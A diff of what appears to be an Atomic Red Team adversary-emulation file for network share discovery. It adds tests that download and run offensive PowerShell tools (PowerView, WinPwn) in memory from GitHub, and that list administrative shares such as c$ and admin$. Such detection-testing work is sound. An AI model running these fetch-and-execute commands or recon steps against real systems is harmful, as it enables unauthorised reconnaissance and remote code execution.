@@ -10,7 +10,7 @@ atomic_tests:
   input_arguments:
     computer_name:
       description: Computer name to find a mount on.
-      type: String
+      type: string
       default: computer1
   executor:
     command: |
@@ -27,12 +27,12 @@ atomic_tests:
   input_arguments:
     package_checker:
       description: Package checking command. Debian - dpkg -s samba
-      type: String
-      default: rpm -q samba
+      type: string
+      default: (rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed)
     package_installer:
       description: Package installer command. Debian - apt install samba
-      type: String
-      default: yum install -y samba
+      type: string
+      default: (which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)
   dependency_executor_name: bash
   dependencies:
   - description: |
@@ -43,7 +43,7 @@ atomic_tests:
       sudo #{package_installer} 
   executor:
     command: |
-      smbstatus --shares
+      sudo smbstatus --shares
     name: bash
     elevation_required: true
 - name: Network Share Discovery command prompt
@@ -56,7 +56,7 @@ atomic_tests:
   input_arguments:
     computer_name:
       description: Computer name to find a mount on.
-      type: String
+      type: string
       default: localhost
   executor:
     command: |
@@ -101,3 +101,53 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
     name: powershell
+- name: PowerView ShareFinder
+  auto_generated_guid: d07e4cc1-98ae-447e-9d31-36cb430d28c4
+  description: PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.
+  supported_platforms:
+  - windows
+  input_arguments:
+    parameters:
+      description: ShareFinder parameter
+      type: string
+      default: -CheckShareAccess
+  dependencies:
+  - description: Invoke-ShareFinder module must exist in %TEMP% directory
+    prereq_command: 'if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1) {exit 0} else {exit 1}'
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1" -OutFile PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1
+  executor:
+    command: |
+      Import-Module PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1
+      Invoke-ShareFinder #{parameters}
+    name: powershell
+- name: WinPwn - shareenumeration
+  auto_generated_guid: 987901d1-5b87-4558-a6d9-cffcabc638b8
+  description: Network share enumeration using the shareenumeration function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      shareenumeration -noninteractive -consoleoutput
+    name: powershell
+- name: Network Share Discovery via dir command
+  auto_generated_guid: 13daa2cf-195a-43df-a8bd-7dd5ffb607b5
+  description: |
+    Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip
+    Upon execution avalaible network shares will be displayed in the commandline session
+  supported_platforms:
+  - windows
+  input_arguments:
+    computer_ip:
+      description: Computer IP to find a mount on.
+      type: string
+      default: 127.0.0.1
+  executor:
+    command: |
+      dir \\#{computer_ip}\c$
+      dir \\#{computer_ip}\admin$
+      dir \\#{computer_ip}\IPC$
+    name: command_prompt
